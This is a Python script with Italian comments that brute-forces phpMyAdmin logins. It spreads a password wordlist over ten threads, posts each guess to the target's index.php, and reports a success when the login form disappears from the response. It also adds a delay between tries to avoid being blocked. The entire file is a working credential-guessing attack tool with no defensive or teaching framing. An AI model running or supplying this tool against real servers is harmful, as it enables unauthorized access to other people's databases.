import requests  # Importa il modulo requests per effettuare richieste HTTP
import threading  # Importa il modulo threading per eseguire operazioni in parallelo
import queue  # Importa il modulo queue per gestire la coda di password
import time  # Importa il modulo time per gestire ritardi tra le richieste

# Funzione per tentare il login
def attempt_login(target_url, username, password_queue, session_cookie):
    # Continua fino a quando la coda di password non è vuota
    while not password_queue.empty():
        # Crea una nuova sessione per ogni tentativo di login
        session = requests.Session()
        login_url = f"{target_url}/index.php"
        password = password_queue.get()  # Ottiene una password dalla coda
        payload = {
            'pma_username': username,  # Nome utente da provare
            'pma_password': password,  # Password da provare
            'server': '1',  # Server di destinazione
            'target': 'index.php'  # Pagina di destinazione
        }

        # Imposta il cookie di sessione se fornito
        if session_cookie:
            session.cookies.set('CookieName', session_cookie)

        try:
            # Effettua una richiesta POST alla pagina di login con il payload
            response = session.post(login_url, data=payload, timeout=10)
            # Controlla se il login è riuscito verificando l'assenza del form di login nella risposta
            if "name=\"login_form\"" not in response.text and response.status_code == 200:
                print(f"[+] Login successful: Username: {username}, Password: {password}")
                return  # Esce dalla funzione se il login è riuscito
            else:
                print(f"[-] Failed: {username}:{password}")
        except requests.RequestException as e:
            # Stampa l'errore e rimette la password in coda per riprovare
            print(f"[!] Error: {e}")
            password_queue.put(password)

        password_queue.task_done()  # Segnala che la password è stata processata
        time.sleep(1)  # Ritardo di 1 secondo tra i tentativi per evitare di essere bloccati

# Funzione principale per configurare il brute force
def brute_force_phpmyadmin(target_url, username, password_list, session_cookie=None, num_threads=10):
    password_queue = queue.Queue()  # Crea una coda per le password

    # Popola la coda con le password
    for password in password_list:
        password_queue.put(password)

    threads = []  # Lista per tenere traccia dei thread

    # Crea e avvia i thread
    for i in range(num_threads):
        thread = threading.Thread(target=attempt_login, args=(target_url, username, password_queue, session_cookie))
        thread.start()
        threads.append(thread)

    # Attende la terminazione di tutti i thread
    for thread in threads:
        thread.join()

    # Controlla se tutte le password sono state provate
    if password_queue.empty():
        print("[-] Brute force attack completed. No valid password found.")

if __name__ == "__main__":
    # Richiede l'URL di destinazione all'utente
    target_url = input("Enter the target URL (e.g., http://example.com/phpmyadmin): ").strip()
    # Richiede il nome utente all'utente
    username = input("Enter the username: ").strip()
    # Richiede il percorso del file con la lista di password all'utente
    password_list_file = input("Enter the path to the password list file: ").strip()
    # Richiede il cookie di sessione all'utente
    session_cookie = input("Enter the session cookie (optional, press enter to skip): ").strip()

    try:
        # Legge la lista di password dal file
        with open(password_list_file, 'r') as file:
            password_list = file.read().splitlines()

        # Avvia il brute force con i parametri forniti
        brute_force_phpmyadmin(target_url, username, password_list, session_cookie)
    except FileNotFoundError:
        print(f"Error: The file '{password_list_file}' does not exist.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
